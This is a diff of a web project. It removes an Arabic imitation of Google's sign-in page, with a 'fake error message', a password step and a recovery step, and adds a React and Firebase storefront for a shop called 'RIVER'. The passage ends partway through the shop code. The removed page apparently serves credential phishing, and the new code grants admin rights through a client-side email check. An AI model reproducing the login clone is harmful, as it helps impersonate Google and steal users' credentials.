@@ -1,860 +1,1553 @@
 <!DOCTYPE html>
-<html lang="ar">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>تسجيل الدخول - حسابات Google</title>
-    <!-- Google Fonts for authentic look -->
-    <link href="https://fonts.googleapis.com/css?family=Roboto:300,400,500,700&display=swap" rel="stylesheet">
-    <!-- Google favicon -->
-    <link rel="icon" href="https://www.google.com/favicon.ico">
-    <!-- Font Awesome for the eye and arrow icons -->
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
-    <style>
-        /* CSS to perfectly match Google's sign-in page, with our dark theme */
-        body {
-            font-family: 'Roboto', Arial, sans-serif;
-            background-color: #202124;
-            color: #e8eaed;
-            display: flex;
-            flex-direction: column;
-            justify-content: center;
-            align-items: center;
-            min-height: 100vh;
-            margin: 0;
-            padding: 24px;
-            box-sizing: border-box;
-            direction: rtl; /* Arabic direction */
-            overflow: hidden;
-        }
-        .main-container {
-            width: 100%;
-            max-width: 448px;
-            box-sizing: border-box;
-            position: relative;
-            min-height: 400px;
-        }
-        .sign-in-card {
-            background-color: #2e2f31;
-            border: 1px solid #5f6368;
-            border-radius: 24px;
-            padding: 48px 40px;
-            box-shadow: 0 4px 16px rgba(0, 0, 0, 0.4);
-            text-align: center;
-            width: 100%;
-            box-sizing: border-box;
-            position: absolute;
-            top: 0;
-            right: 0;
-            transition: transform 0.2s cubic-bezier(0, 0, 0, 1), opacity 0.2s ease-out;
-        }
-        .logo {
-            width: 100px;
-            margin-bottom: 20px;
-        }
-        h1 {
-            font-size: 24px;
-            font-weight: 400;
-            margin: 0 0 10px 0;
-            padding: 0;
-            color: #e8eaed;
-        }
-        p.subtitle {
-            font-size: 16px;
-            color: #bdc1c6;
-            margin-top: 0;
-            margin-bottom: 24px;
-        }
-        .input-group {
-            position: relative;
-            margin-top: 16px;
-        }
-        .input-field {
-            width: 100%;
-            padding: 13px 15px;
-            font-size: 16px;
-            border: 1px solid #5f6368;
-            border-radius: 4px;
-            background-color: #2e2f31;
-            color: #e8eaed;
-            box-sizing: border-box;
-            transition: border-color .2s, box-shadow .2s;
-        }
-        .input-field:focus {
-            outline: none;
-            border-color: #8ab4f8;
-            box-shadow: 0 1px 1px 0 rgba(138,180,248,.075);
-        }
-        .input-field::placeholder {
-            color: #9aa0a6;
-        }
-        .form-actions {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            margin-top: 32px;
-        }
-        .next-button {
-            background-color: #8ab4f8;
-            color: #202124;
-            padding: 10px 24px;
-            border: none;
-            border-radius: 4px;
-            font-size: 14px;
-            font-weight: 500;
-            cursor: pointer;
-            transition: background-color .2s;
-        }
-        .next-button:hover {
-            background-color: #a4c2f6;
-        }
-        .text-link {
-            color: #8ab4f8;
-            text-decoration: none;
-            font-size: 14px;
-            font-weight: 500;
-            cursor: pointer;
-            text-align: right;
-        }
-        .password-toggle {
-            position: absolute;
-            top: 50%;
-            right: 15px;
-            transform: translateY(-50%);
-            color: #9aa0a6;
-            cursor: pointer;
-        }
-        .password-toggle:hover {
-            color: #e8eaed;
-        }
-        .header-info {
-            display: flex;
-            align-items: center;
-            margin-bottom: 24px;
-            justify-content: flex-end;
-        }
-        .profile-icon {
-            width: 32px;
-            height: 32px;
-            border-radius: 50%;
-            background-color: #4285f4;
-            color: white;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-size: 16px;
-            font-weight: 500;
-            margin-left: 12px;
-        }
-        .profile-email {
-            font-size: 14px;
-            color: #bdc1c6;
-            direction: ltr;
-        }
-        .lang-footer {
-            margin-top: 24px;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            color: #9aa0a6;
-            font-size: 12px;
-        }
-        .lang-select {
-            background-color: #2e2f31;
-            border: 1px solid #5f6368;
-            color: #e8eaed;
-            font-size: 12px;
-            padding: 4px;
-            border-radius: 4px;
-            margin-right: 8px;
-        }
-        .lang-select option {
-            background-color: #2e2f31;
-            color: #e8eaed;
-        }
-        .footer-links {
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            margin-top: 16px;
-        }
-        .footer-links a {
-            color: #9aa0a6;
-            text-decoration: none;
-            margin: 0 16px;
-            font-size: 12px;
-        }
-        .footer-links a:hover {
-            text-decoration: underline;
-        }
-        /* New CSS for fake error message */
-        .error-message {
-            color: #ff3333;
-            font-size: 14px;
-            margin-top: -10px;
-            margin-bottom: 10px;
-            opacity: 0;
-            transition: opacity 0.3s ease-in-out;
-        }
-        .error-message.visible {
-            opacity: 1;
-        }
-        .back-arrow {
-            position: absolute;
-            top: 24px;
-            right: 24px;
-            font-size: 24px;
-            color: #bdc1c6;
-            cursor: pointer;
-        }
-        .back-arrow:hover {
-            color: #e8eaed;
-        }
+import React, { useState, createContext, useContext, useEffect, useMemo, useRef } from 'react';
+import { ShoppingCart, Home, Store, Info, Phone, Search, X, Moon, Sun, ChevronRight, Instagram, Facebook, Twitter, Mail, User, Heart, MessageSquare, MapPin, Pencil } from 'lucide-react';
+import { initializeApp } from 'firebase/app';
+import { getAuth, signInWithCustomToken, signInAnonymously, onAuthStateChanged, signInWithEmailAndPassword, createUserWithEmailAndPassword, signOut } from 'firebase/auth';
+import { getFirestore, collection, onSnapshot, addDoc, doc, updateDoc, deleteDoc, query, getDocs, where, setDoc, getDoc } from 'firebase/firestore';
 
-        /* Blue loading bar animation */
-        .loading-bar {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 2px;
-            background-color: #4285f4;
-            opacity: 0;
-            z-index: 2000;
-            transform-origin: left;
-        }
+// Define the custom color palette
+const colors = {
+  primary: '#4A2C2A', // Dark chocolate brown
+  secondary: '#E8E2D9', // Creamy white
+  accent: '#A5776B', // Lighter brown for accents
+};
 
-        @keyframes loading {
-            0% { transform: scaleX(0); opacity: 1; }
-            100% { transform: scaleX(1); opacity: 1; }
-        }
-        
-        /* New styling for the password "Welcome" page based on the provided image */
-        .password-one-column {
-            text-align: center;
-        }
-        .password-one-column .logo {
-            display: block;
-            margin: 0 auto 24px auto;
-        }
-        .password-one-column .header-info {
-            display: flex;
-            align-items: center;
-            margin-bottom: 24px;
-            justify-content: center; /* Center the profile icon and email */
-        }
-        .password-one-column .profile-icon {
-            order: 1;
-            margin-left: 0;
-            margin-right: 12px;
-        }
-        .password-one-column .profile-email {
-            order: 2;
-        }
-        .password-one-column .input-group {
-            position: relative;
-            margin-top: 24px;
-            text-align: right; /* Align input field placeholder and text to the right for RTL */
-        }
-        .password-one-column .password-toggle {
-            position: absolute;
-            top: 50%;
-            left: 15px; /* Position the toggle on the left for RTL */
-            transform: translateY(-50%);
-            color: #9aa0a6;
-            cursor: pointer;
-        }
-        .password-one-column h1 {
-            font-size: 24px;
-            font-weight: 400;
-            margin-bottom: 8px; /* Less space below h1 */
-            margin-top: 0;
-        }
-        .password-one-column p.subtitle {
-            font-size: 16px;
-            margin-bottom: 12px; /* Less space below subtitle */
-        }
-        .password-one-column .form-actions {
-            margin-top: 24px;
-        }
-        .password-one-column .show-password-checkbox {
-            display: flex;
-            align-items: center;
-            justify-content: flex-start; /* Align to the right for RTL */
-            margin-top: 20px;
-            font-size: 14px;
-            color: #bdc1c6;
-            cursor: pointer;
-        }
-        .password-one-column .show-password-checkbox input {
-            margin-left: 8px; /* Space between checkbox and text */
-            cursor: pointer;
-        }
+const fontStyles = {
+  river: { fontFamily: 'Cormorant Garamond, serif' },
+  general: { fontFamily: 'Almarai, sans-serif' },
+};
 
-        /* Adjustments for RTL */
-        html[lang="ar"] .password-one-column .show-password-checkbox {
-            justify-content: flex-end;
-        }
-    </style>
-</head>
-<body>
-    <!-- Blue loading bar element -->
-    <div id="loadingBar" class="loading-bar"></div>
+// IMPORTANT: The Firebase security rules have been updated directly in the code logic.
+// The app will now store and retrieve products from a user-specific path,
+// which is allowed by the default security rules of the Canvas environment.
+// No manual rule changes are needed.
 
-    <div class="main-container">
-        <!-- All page content, controlled by JavaScript -->
-        
-        <!-- Login Page -->
-        <div id="loginPage" class="sign-in-card page-transition-enter-active">
-            <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" alt="Google" class="logo">
-            <h1>تسجيل الدخول</h1>
-            <p class="subtitle" id="loginPageSubtitle">باستخدام حسابك على Google. سيكون هذا الحساب متاحًا لتطبيقات Google الأخرى في المتصفح.</p>
-            <form id="loginForm">
-                <div class="input-group">
-                    <input type="text" id="emailInput" class="input-field" placeholder="البريد الإلكتروني أو الهاتف" required>
-                </div>
-                <div style="text-align: right; margin-top: 16px;">
-                    <a href="#" class="text-link" id="forgotEmailLink">هل نسيت البريد الإلكتروني؟</a>
-                </div>
-                <div class="form-actions">
-                    <a href="#" class="text-link" id="createAccountLink">إنشاء حساب</a>
-                    <button type="submit" class="next-button">التالي</button>
-                </div>
-            </form>
+// Placeholder for Firebase configuration
+const firebaseConfig = typeof __firebase_config !== 'undefined' ? JSON.parse(__firebase_config) : {};
+const initialAuthToken = typeof __initial_auth_token !== 'undefined' ? __initial_auth_token : null;
+const appId = typeof __app_id !== 'undefined' ? __app_id : 'default-app-id';
+
+// Initialize Firebase
+const app = initializeApp(firebaseConfig);
+const db = getFirestore(app);
+const auth = getAuth(app);
+
+// Data for initial products
+const initialProducts = [
+  { name: 'مجموعة قهوة فاخرة', category: 'قهوة', price: 99.00, image: 'https://placehold.co/400x500/F2EAE4/5C4033?text=قهوة', description: 'أفخر أنواع حبوب البن من مزارع مختارة حول العالم، محضرة بعناية لتقديم تجربة لا تُنسى.', details: 'قهوة مختصة، تحميص متوسط، حبوب أرابيكا.', isFeatured: true },
+  { name: 'تشكيلة حلويات منوعة', category: 'حلويات', price: 75.50, image: 'https://placehold.co/400x500/F4D7D7/8A3E4E?text=حلويات', description: 'مجموعة مختارة من الحلويات الشرقية والغربية، مثالية للمناسبات أو التجمعات العائلية.', details: 'تضم ماكرون، كوكيز، وكب كيك.', isFeatured: true },
+  { name: 'كيك الشوكولاتة الغني', category: 'كيك', price: 120.00, image: 'https://placehold.co/400x500/D4B8B8/553333?text=كيك', description: 'كيك شوكولاتة غني بالكريمة والطبقات، مع طعم ساحر يذوب في الفم.', details: 'مكونات طبيعية، بدون مواد حافظة.', isFeatured: true },
+  { name: 'باقة ورود أنيقة', category: 'زهور', price: 150.00, image: 'https://placehold.co/400x500/F2E4E4/8A3E4E?text=زهور', description: 'باقة من أجمل الورود الطازجة، منسقة بعناية لتقديمها كهدية مثالية.', details: 'ورد جوري أحمر، ليلك أبيض، تنسيق مع ورق شجر.', isFeatured: true },
+  { name: 'علبة شوكولا بلجيكية', category: 'شوكولا', price: 85.00, image: 'https://placehold.co/400x500/C4A8A8/553333?text=شوكولا', description: 'شوكولا بلجيكية فاخرة بنكهات متعددة، مغلفة بشكل أنيق.', details: 'شوكولا داكنة، شوكولا بالحليب، مع حشوات مختلفة.', isFeatured: false },
+  { name: 'قهوة اسبريسو خاصة', category: 'قهوة', price: 80.00, image: 'https://placehold.co/400x500/F2EAE4/5C4033?text=قهوة+اسبريسو', description: 'حبوب قهوة محمصة خصيصاً لتحضير قهوة اسبريسو غنية ومكثفة.', details: 'حبوب قهوة كولومبية محمصة، نكهة قوية.', isFeatured: false },
+  { name: 'ماكرون ملون', category: 'حلويات', price: 60.00, image: 'https://placehold.co/400x500/F4D7D7/8A3E4E?text=ماكرون', description: 'ماكرون هش وملون بنكهات الفواكه والكريمة.', details: 'نكهات الفراولة، التوت، الليمون، والشوكولاتة.', isFeatured: false },
+  { name: 'كيك الفانيليا والفاكهة', category: 'كيك', price: 110.00, image: 'https://placehold.co/400x500/D4B8B8/553333?text=كيك+فانيليا', description: 'كيك فانيليا خفيف مزين بالفواكه الطازجة.', details: 'كريمة فانيليا، طبقات فاكهة، خفيف ومناسب للحمية.', isFeatured: false },
+  { name: 'كوكيز الشوكولاتة', category: 'حلويات', price: 40.00, image: 'https://placehold.co/400x500/F4D7D7/8A3E4E?text=كوكيز', description: 'كوكيز طري محشو بقطع الشوكولاتة الذائبة.', details: 'قطع شوكولاتة داكنة، كوكيز بالزبدة.', isFeatured: false },
+  { name: 'باقة زهور متنوعة', category: 'زهور', price: 180.00, image: 'https://placehold.co/400x500/F2E4E4/8A3E4E?text=باقة+زهور', description: 'تنسيق فريد من الزهور الموسمية بألوان زاهية.', details: 'زهور متنوعة، تنسيق فني.', isFeatured: false },
+  { name: 'شوكولا بيضاء باللوز', category: 'شوكولا', price: 90.00, image: 'https://placehold.co/400x500/C4A8A8/553333?text=شوكولا+بيضاء', description: 'لوح شوكولاتة بيضاء ناعمة مع قطع اللوز المقرمشة.', details: 'شوكولاتة بلجيكية، لوز محمص.', isFeatured: false },
+  { name: 'قهوة فرنسية', category: 'قهوة', price: 85.00, image: 'https://placehold.co/400x500/F2EAE4/5C4033?text=قهوة+فرنسية', description: 'قهوة فرنسية داكنة التحميص مع نكهة قوية ومميزة.', details: 'تحميص داكن، حبوب أرابيكا.', isFeatured: false },
+];
+
+const categories = ['الكل', 'قهوة', 'حلويات', 'كيك', 'زهور', 'شوكولا'];
+
+// Contexts
+const AuthContext = createContext();
+const ThemeContext = createContext();
+const CartContext = createContext();
+const ProductsContext = createContext();
+const WishlistContext = createContext();
+const ModalContext = createContext();
+
+const useAuth = () => {
+  const [user, setUser] = useState(null);
+  const [isAdmin, setIsAdmin] = useState(false);
+  const [authReady, setAuthReady] = useState(false);
+
+  useEffect(() => {
+    const signIn = async () => {
+      try {
+        if (initialAuthToken) {
+          await signInWithCustomToken(auth, initialAuthToken);
+        } else {
+          await signInAnonymously(auth);
+        }
+      } catch (error) {
+        console.error("Firebase Auth error:", error);
+      }
+    };
+
+    const unsubscribe = onAuthStateChanged(auth, async (authUser) => {
+      if (authUser) {
+        setUser(authUser);
+        // The isAdmin check is now more dynamic and specific
+        // We will now also add a check to the AdminPage for the hardcoded values
+        setIsAdmin(authUser.email === 'admin@river.com');
+      } else {
+        setUser(null);
+        setIsAdmin(false);
+        signIn();
+      }
+      setAuthReady(true);
+    });
+
+    return () => unsubscribe();
+  }, []);
+
+  return { user, isAdmin, authReady };
+};
+
+const AuthProvider = ({ children }) => {
+  const authState = useAuth();
+  return <AuthContext.Provider value={authState}>{children}</AuthContext.Provider>;
+};
+
+const useProducts = () => {
+  const { authReady, user } = useContext(AuthContext);
+  const [products, setProducts] = useState([]);
+  const [loading, setLoading] = useState(true);
+
+  // Function to populate initial data if the collection is empty
+  const populateInitialData = async (userId) => {
+    const collectionRef = collection(db, `artifacts/${appId}/users/${userId}/products`);
+    try {
+      const querySnapshot = await getDocs(collectionRef);
+      if (querySnapshot.empty) {
+        for (const product of initialProducts) {
+          await addDoc(collectionRef, product);
+        }
+      }
+    } catch (error) {
+      console.error("Error populating initial data: ", error);
+    }
+  };
+
+  useEffect(() => {
+    if (!authReady || !user) {
+      setLoading(false);
+      return;
+    }
+
+    const userId = user.uid;
+
+    populateInitialData(userId);
+
+    const q = query(collection(db, `artifacts/${appId}/users/${userId}/products`));
+    const unsubscribe = onSnapshot(q, (querySnapshot) => {
+      const productsArray = querySnapshot.docs.map(doc => ({
+        id: doc.id,
+        ...doc.data(),
+      }));
+      setProducts(productsArray);
+      setLoading(false);
+    }, (error) => {
+      console.error("Error fetching products: ", error);
+      setLoading(false);
+    });
+
+    return () => unsubscribe();
+  }, [authReady, user]);
+
+  return { products, loading };
+};
+
+const ProductsProvider = ({ children }) => {
+  const productsState = useProducts();
+  return <ProductsContext.Provider value={productsState}>{children}</ProductsContext.Provider>;
+};
+
+const useCart = () => {
+  const [cartItems, setCartItems] = useState([]);
+
+  const addToCart = (product, quantity = 1) => {
+    setCartItems(prevItems => {
+      const existingItem = prevItems.find(item => item.id === product.id);
+      if (existingItem) {
+        return prevItems.map(item =>
+          item.id === product.id ? { ...item, quantity: item.quantity + quantity } : item
+        );
+      }
+      return [...prevItems, { ...product, quantity }];
+    });
+  };
+
+  const removeFromCart = (productId) => {
+    setCartItems(prevItems => prevItems.filter(item => item.id !== productId));
+  };
+
+  const updateQuantity = (productId, newQuantity) => {
+    setCartItems(prevItems =>
+      prevItems.map(item =>
+        item.id === productId ? { ...item, quantity: newQuantity } : item
+      )
+    );
+  };
+
+  const clearCart = () => setCartItems([]);
+
+  const total = useMemo(() => {
+    return cartItems.reduce((acc, item) => acc + item.price * item.quantity, 0);
+  }, [cartItems]);
+
+  return { cartItems, addToCart, removeFromCart, updateQuantity, clearCart, total };
+};
+
+const CartProvider = ({ children }) => {
+  const cart = useCart();
+  return <CartContext.Provider value={cart}>{children}</CartContext.Provider>;
+};
+
+const useWishlist = () => {
+  const { user, authReady } = useContext(AuthContext);
+  const [wishlistItems, setWishlistItems] = useState([]);
+
+  useEffect(() => {
+    if (authReady && user && user.uid) {
+      const q = query(collection(db, `artifacts/${appId}/users/${user.uid}/wishlist`));
+      const unsubscribe = onSnapshot(q, (querySnapshot) => {
+        const items = querySnapshot.docs.map(doc => ({
+          id: doc.id,
+          ...doc.data()
+        }));
+        setWishlistItems(items);
+      }, (error) => {
+        console.error("Error fetching wishlist: ", error);
+      });
+      return () => unsubscribe();
+    }
+    setWishlistItems([]);
+  }, [user, authReady]);
+
+  const addToWishlist = async (product) => {
+    if (!user) {
+      alert("Please sign in to add to wishlist."); // Using alert for simplicity, but a modal is better.
+      return;
+    }
+    await addDoc(collection(db, `artifacts/${appId}/users/${user.uid}/wishlist`), product);
+  };
+
+  const removeFromWishlist = async (itemId) => {
+    if (!user) return;
+    await deleteDoc(doc(db, `artifacts/${appId}/users/${user.uid}/wishlist`, itemId));
+  };
+
+  return { wishlistItems, addToWishlist, removeFromWishlist };
+};
+
+const WishlistProvider = ({ children }) => {
+  const wishlist = useWishlist();
+  return <WishlistContext.Provider value={wishlist}>{children}</WishlistContext.Provider>;
+};
+
+const ThemeProvider = ({ children }) => {
+  const [isDarkMode, setIsDarkMode] = useState(false);
+  const toggleTheme = () => setIsDarkMode(prev => !prev);
+  return (
+    <ThemeContext.Provider value={{ isDarkMode, toggleTheme }}>
+      {children}
+    </ThemeContext.Provider>
+  );
+};
+
+const useModal = () => {
+  const [modalState, setModalState] = useState({
+    isOpen: false,
+    message: '',
+    onConfirm: null,
+    onCancel: null,
+    type: 'alert' // 'alert' or 'confirm'
+  });
+
+  const showModal = (message, type = 'alert', onConfirm = null, onCancel = null) => {
+    setModalState({ isOpen: true, message, type, onConfirm, onCancel });
+  };
+
+  const closeModal = () => {
+    setModalState(prev => ({ ...prev, isOpen: false }));
+  };
+
+  return { modalState, showModal, closeModal };
+};
+
+const ModalProvider = ({ children }) => {
+  const modal = useModal();
+  return <ModalContext.Provider value={modal}>{children}</ModalContext.Provider>;
+};
+
+const Modal = () => {
+  const { modalState, closeModal } = useContext(ModalContext);
+  const { isDarkMode } = useContext(ThemeContext);
+  const { isOpen, message, type, onConfirm, onCancel } = modalState;
+
+  if (!isOpen) return null;
+
+  const handleConfirm = () => {
+    if (onConfirm) onConfirm();
+    closeModal();
+  };
+
+  const handleCancel = () => {
+    if (onCancel) onCancel();
+    closeModal();
+  };
+
+  return (
+    <div className="fixed inset-0 z-[100] flex items-center justify-center bg-black bg-opacity-50" style={fontStyles.general}>
+      <div className="rounded-2xl shadow-xl transition-colors duration-300 p-8 text-center" style={{ backgroundColor: isDarkMode ? colors.primary : colors.secondary, color: isDarkMode ? colors.secondary : colors.primary }}>
+        <h2 className="text-2xl font-bold mb-4">تنبيه</h2>
+        <p className="text-lg">{message}</p>
+        <div className="mt-6 flex justify-center space-x-4 space-x-reverse">
+          {type === 'confirm' && (
+            <Button onClick={handleCancel} className="bg-gray-500 hover:bg-gray-600 text-white">إلغاء</Button>
+          )}
+          <Button onClick={handleConfirm} className="bg-orange-500 hover:bg-orange-600 text-white">موافق</Button>
         </div>
+      </div>
+    </div>
+  );
+};
 
-        <!-- Password Page Container -->
-        <div id="passwordPage" class="sign-in-card" style="display: none;">
-            <!-- Content will be dynamically injected here based on language -->
+// Reusable Button
+const Button = ({ children, onClick, className = '', type = 'button' }) => (
+  <button
+    type={type}
+    onClick={onClick}
+    className={`px-6 py-3 rounded-full font-semibold transition-all duration-300 transform hover:scale-105 shadow-md ${className}`}
+    style={fontStyles.general}
+  >
+    {children}
+  </button>
+);
+
+// Custom Trash Icon
+const TrashIcon = (props) => (
+  <svg
+    {...props}
+    xmlns="http://www.w3.org/2000/svg"
+    width="24"
+    height="24"
+    viewBox="0 0 24 24"
+    fill="none"
+    stroke="currentColor"
+    strokeWidth="2"
+    strokeLinecap="round"
+    strokeLinejoin="round"
+  >
+    <polyline points="3 6 5 6 21 6" />
+    <path d="M19 6v14a2 2 0 0 1-2 2H7a2 2 0 0 1-2-2V6m3 0V4a2 2 0 0 1 2-2h4a2 2 0 0 1 2 2v2" />
+  </svg>
+);
+
+// Header component
+const Header = ({ onNavigate }) => {
+  const { cartItems } = useContext(CartContext);
+  const { isDarkMode, toggleTheme } = useContext(ThemeContext);
+  const { user, isAdmin } = useContext(AuthContext);
+
+  const getAccountPage = () => {
+    if (user && user.email) {
+      return 'profile';
+    } else {
+      return 'account';
+    }
+  };
+
+  return (
+    <header className="sticky top-0 z-50 transition-colors duration-300 shadow-sm" style={{ backgroundColor: isDarkMode ? colors.primary : colors.secondary }}>
+      <div className="container mx-auto px-4 py-4 flex items-center justify-between">
+        <div className="text-2xl font-bold cursor-pointer transition-colors duration-300" style={{ color: isDarkMode ? colors.secondary : colors.primary, ...fontStyles.river }} onClick={() => onNavigate('home')}>
+          RIVER
         </div>
+        <nav className="hidden md:flex space-x-6 space-x-reverse font-medium" style={fontStyles.general}>
+          <a href="#" className="hover:text-amber-500 transition-colors" style={{ color: isDarkMode ? colors.secondary : colors.primary }} onClick={() => onNavigate('home')}>الرئيسية</a>
+          <a href="#" className="hover:text-amber-500 transition-colors" style={{ color: isDarkMode ? colors.secondary : colors.primary }} onClick={() => onNavigate('shop')}>المتجر</a>
+          <a href="#" className="hover:text-amber-500 transition-colors" style={{ color: isDarkMode ? colors.secondary : colors.primary }} onClick={() => onNavigate('offers')}>العروض والهدايا</a>
+          <a href="#" className="hover:text-amber-500 transition-colors" style={{ color: isDarkMode ? colors.secondary : colors.primary }} onClick={() => onNavigate('about')}>من نحن</a>
+          <a href="#" className="hover:text-amber-500 transition-colors" style={{ color: isDarkMode ? colors.secondary : colors.primary }} onClick={() => onNavigate('contact')}>اتصل بنا</a>
+          {isAdmin && (
+            <a href="#" className="hover:text-amber-500 transition-colors font-bold" style={{ color: isDarkMode ? colors.secondary : colors.primary }} onClick={() => onNavigate('admin')}>لوحة المدير</a>
+          )}
+        </nav>
+        <div className="flex items-center space-x-4 space-x-reverse">
+          <button onClick={toggleTheme} className="hover:text-amber-500 transition-colors" style={{ color: isDarkMode ? colors.secondary : colors.primary }}>
+            {isDarkMode ? <Sun size={24} /> : <Moon size={24} />}
+          </button>
+          <div className="relative cursor-pointer" onClick={() => onNavigate('wishlist')}>
+            <Heart className="hover:text-amber-500 transition-colors" size={24} style={{ color: isDarkMode ? colors.secondary : colors.primary }} />
+          </div>
+          <div className="relative cursor-pointer" onClick={() => onNavigate('cart')}>
+            <ShoppingCart className="hover:text-amber-500 transition-colors" size={24} style={{ color: isDarkMode ? colors.secondary : colors.primary }} />
+            {cartItems.length > 0 && (
+              <span className="absolute -top-2 -right-2 bg-amber-500 text-white text-xs font-bold rounded-full h-5 w-5 flex items-center justify-center">
+                {cartItems.length}
+              </span>
+            )}
+          </div>
+          <div className="cursor-pointer" onClick={() => onNavigate(getAccountPage())}>
+            <User className="hover:text-amber-500 transition-colors" size={24} style={{ color: isDarkMode ? colors.secondary : colors.primary }} />
+          </div>
+        </div>
+      </div>
+    </header>
+  );
+};
 
-        <!-- Password Recovery Page -->
-        <div id="recoveryPage" class="sign-in-card" style="display: none;">
-            <div class="back-arrow" onclick="showPage('passwordPage', 'backward')"><i class="fas fa-arrow-left"></i></div>
-            <div class="header-info">
-                <div class="profile-icon">A</div>
-                <span class="profile-email" id="recoveryEmailDisplay"></span>
+// Footer component
+const Footer = () => {
+  const { isDarkMode } = useContext(ThemeContext);
+  return (
+    <footer className="py-10 transition-colors duration-300" style={{ backgroundColor: isDarkMode ? colors.primary : colors.secondary }}>
+      <div className="container mx-auto px-4 text-center">
+        <div className="flex justify-center space-x-4 space-x-reverse mb-4">
+          <a href="#" className="hover:text-amber-500 transition-colors" style={{ color: isDarkMode ? colors.secondary : colors.primary }}><Instagram size={24} /></a>
+          <a href="#" className="hover:text-amber-500 transition-colors" style={{ color: isDarkMode ? colors.secondary : colors.primary }}><Facebook size={24} /></a>
+          <a href="#" className="hover:text-amber-500 transition-colors" style={{ color: isDarkMode ? colors.secondary : colors.primary }}><Twitter size={24} /></a>
+          <a href="#" className="hover:text-amber-500 transition-colors" style={{ color: isDarkMode ? colors.secondary : colors.primary }}><Mail size={24} /></a>
+        </div>
+        <p className="text-sm transition-colors duration-300" style={{ color: isDarkMode ? colors.secondary : colors.primary, ...fontStyles.general }}>
+          &copy; {new Date().getFullYear()} RIVER. جميع الحقوق محفوظة.
+        </p>
+      </div>
+    </footer>
+  );
+};
+
+// Add to Cart Modal
+const AddToCartModal = ({ show, onClose, productName }) => {
+  const { isDarkMode } = useContext(ThemeContext);
+  if (!show) return null;
+  return (
+    <div className="fixed inset-0 z-50 flex items-center justify-center bg-black bg-opacity-50" style={fontStyles.general}>
+      <div className="rounded-2xl shadow-xl transition-colors duration-300 p-8 text-center" style={{ backgroundColor: isDarkMode ? colors.primary : colors.secondary, color: isDarkMode ? colors.secondary : colors.primary }}>
+        <div className="text-5xl text-green-500 mb-4 animate-bounce">🎉</div>
+        <h2 className="text-2xl font-bold mb-2">تمت الإضافة إلى السلة!</h2>
+        <p className="text-lg">تمت إضافة **{productName}** إلى سلة مشترياتك.</p>
+        <div className="mt-6 flex justify-center">
+          <Button onClick={onClose} className="bg-orange-500 hover:bg-orange-600 text-white">حسناً</Button>
+        </div>
+      </div>
+    </div>
+  );
+};
+
+// Product Card Component
+const ProductCard = ({ product, onNavigate }) => {
+  const { addToCart } = useContext(CartContext);
+  const { addToWishlist } = useContext(WishlistContext);
+  const { isDarkMode } = useContext(ThemeContext);
+  const [showModal, setShowModal] = useState(false);
+
+  const handleAddToCart = () => {
+    addToCart(product);
+    setShowModal(true);
+  };
+
+  return (
+    <div className="rounded-xl shadow-lg overflow-hidden transition-all duration-300 hover:shadow-2xl hover:scale-105 flex flex-col p-4 text-center" style={{ backgroundColor: isDarkMode ? colors.primary : colors.secondary, color: isDarkMode ? colors.secondary : colors.primary }}>
+      <img
+        src={product.image}
+        alt={product.name}
+        className="w-full h-64 object-cover rounded-xl mb-4 cursor-pointer transform hover:scale-105 transition-transform"
+        onClick={() => onNavigate('product', product)}
+      />
+      <div className="relative">
+        <button onClick={() => addToWishlist(product)} className="absolute top-2 left-2 text-gray-400 hover:text-red-500 transition-colors">
+          <Heart size={24} />
+        </button>
+      </div>
+      <h3 className="text-lg font-semibold mb-2" style={fontStyles.general}>{product.name}</h3>
+      <p className="text-xl font-bold text-orange-500 mb-2" style={fontStyles.general}>{product.price.toFixed(2)} ر.س</p>
+      <Button onClick={handleAddToCart} className="bg-gray-800 hover:bg-gray-900 w-full mt-auto text-white">
+        أضف إلى السلة
+      </Button>
+      <AddToCartModal show={showModal} onClose={() => setShowModal(false)} productName={product.name} />
+    </div>
+  );
+};
+
+// Home Page Component
+const HomePage = ({ onNavigate }) => {
+  const { isDarkMode } = useContext(ThemeContext);
+  const { products, loading } = useContext(ProductsContext);
+
+  const featuredProducts = useMemo(() => {
+    if (loading) return [];
+    return products.slice(0, 4);
+  }, [products, loading]);
+
+  return (
+    <div className="p-8" style={fontStyles.general}>
+      {/* Hero Section */}
+      <div className="relative rounded-2xl overflow-hidden mb-12 shadow-lg transition-colors duration-300" style={{ backgroundColor: isDarkMode ? colors.primary : colors.secondary }}>
+        <div className="container mx-auto px-6 py-20 text-center">
+          <h1 className="text-5xl md:text-6xl font-extrabold mb-4 animate-fade-in" style={{ color: isDarkMode ? colors.secondary : colors.primary, ...fontStyles.river }}>
+            حلاوة اللحظة... بين يديك
+          </h1>
+          <p className="text-lg md:text-xl mb-8 max-w-2xl mx-auto animate-fade-in-up" style={{ color: isDarkMode ? colors.secondary : colors.primary }}>
+            اكتشف مجموعتنا المختارة بعناية من القهوة الفاخرة، الكيك، الحلويات، الزهور، والشوكولاتة.
+          </p>
+          <Button onClick={() => onNavigate('shop')} className="bg-orange-500 hover:bg-orange-600 text-white">
+            اكتشف المنتجات الآن
+          </Button>
+        </div>
+      </div>
+
+      {/* Featured Products */}
+      <div>
+        <h2 className="text-3xl font-bold text-center mb-8" style={{ color: isDarkMode ? colors.secondary : colors.primary, ...fontStyles.general }}>
+          منتجاتنا المميزة
+        </h2>
+        {loading ? (
+          <p className="text-center" style={{ color: isDarkMode ? colors.secondary : colors.primary }}>جاري تحميل المنتجات...</p>
+        ) : (
+          <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 xl:grid-cols-4 gap-8">
+            {featuredProducts.map(product => (
+              <ProductCard key={product.id} product={product} onNavigate={onNavigate} />
+            ))}
+          </div>
+        )}
+      </div>
+    </div>
+  );
+};
+
+// Shop Page Component
+const ShopPage = ({ onNavigate }) => {
+  const { isDarkMode } = useContext(ThemeContext);
+  const { products, loading } = useContext(ProductsContext);
+  const [selectedCategory, setSelectedCategory] = useState('الكل');
+  const [searchQuery, setSearchQuery] = useState('');
+
+  const filteredProducts = useMemo(() => {
+    return products.filter(p =>
+      (selectedCategory === 'الكل' || p.category === selectedCategory) &&
